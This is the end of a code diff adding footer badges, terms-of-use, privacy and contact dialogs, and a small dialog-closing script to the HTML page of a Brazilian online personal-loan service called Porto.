+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da Porto, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A Porto é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A Porto coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4>Email</h4><p>contato@bancoporto.com.br</p></div></div>
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg></div><div><h4>ParceiroChat</h4><p>(11) 98765-4321</p></div></div>
+    <div class="ss-contact-note"><p><strong>CNPJ:</strong> 30.680.829/0001-43</p><p><strong>Razão Social:</strong> Banco Porto S.A.</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll(".ss-dialog").forEach(function(d){d.addEventListener("click",function(e){if(e.target===d)d.close();});});
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
